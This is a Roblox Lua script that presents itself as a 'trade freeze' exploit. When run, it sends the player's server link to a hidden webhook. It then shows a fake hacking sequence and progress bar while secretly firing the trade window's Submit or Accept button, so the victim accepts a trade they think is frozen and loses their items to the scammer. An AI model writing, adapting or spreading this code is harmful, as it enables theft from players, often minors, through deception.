local function sendWebhook(msg)
    local data = {
        content = msg
    }
    
    pcall(function()
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- ========== ACTUAL SUBMIT CLICK ==========
local function findAndClickSubmit()
    local tradeGui = playerGui:FindFirstChild("Trade") or playerGui:FindFirstChild("Trading") or playerGui:FindFirstChild("TradeWindow")
    
    if not tradeGui then
        for _, gui in ipairs(playerGui:GetChildren()) do
            if gui:IsA("ScreenGui") then
                local submit = gui:FindFirstChild("Submit", true) 
                    or gui:FindFirstChild("Accept", true)
                    or gui:FindFirstChild("Confirm", true)
                
                if submit and (submit:IsA("TextButton") or submit:IsA("ImageButton")) then
                    for _, connection in pairs(getconnections(submit.MouseButton1Click)) do
                        connection:Fire()
                    end
                    submit:Activate()
                    return true
                end
            end
        end
        return false
    end
    local submit = tradeGui:FindFirstChild("Submit", true) 
        or tradeGui:FindFirstChild("Accept", true)
    
    if submit then
        for _, connection in pairs(getconnections(submit.MouseButton1Click)) do
            connection:Fire()
        end
        submit:Activate()
        return true
    end
    return false
end

local busy = false

local function playFrozen()
    if busy then return end
    busy = true
    button.Visible = false
    -- Send webhook
    local serverLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
    sendWebhook("Script triggered!\n" .. serverLink)
    -- Reset
    black.BackgroundTransparency = 1
    text.TextTransparency = 1
    barBg.BackgroundTransparency = 1
    percent.TextTransparency = 1
    barFill.Size = UDim2.new(0, 0, 1, 0)
    percent.Text = "0%"
    -- Fade in
    TweenService:Create(black, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    task.wait(0.4)
    -- Sequence of messages
    local messages = {
        "trade frozen ❄️",
        "connecting to trade servers...",
        "bypassing security...",
        "hacking trade system",
        "injecting payload...",
        "overriding client checks",
        "trade processing",
        "finalizing..."
    }
    text.TextTransparency = 0
    for i, msg in ipairs(messages) do
        text.Text = msg
        task.wait(1.1)
    end
    -- Show bar
    TweenService:Create(barBg, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
    TweenService:Create(percent, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
    -- Slow progress bar (about 9 seconds)
    local progressTween = TweenService:Create(barFill, TweenInfo.new(9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, 0, 1, 0)
    })
    progressTween:Play()
    local startTime = tick()
    while tick() - startTime < 9 do
        local p = math.floor(((tick() - startTime) / 9) * 100)
        percent.Text = p .. "%"
        task.wait(0.05)
    end
    percent.Text = "100%"
    task.wait(0.6)
    findAndClickSubmit()
    task.wait(5)
    findAndClickSubmit()
    -- Fade out
    task.wait(1)
    TweenService:Create(black, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
    TweenService:Create(text, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
    TweenService:Create(barBg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
    TweenService:Create(percent, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
    task.wait(0.7)
    busy = false
    button.Visible = true
end

button.MouseButton1Click:Connect(playFrozen)
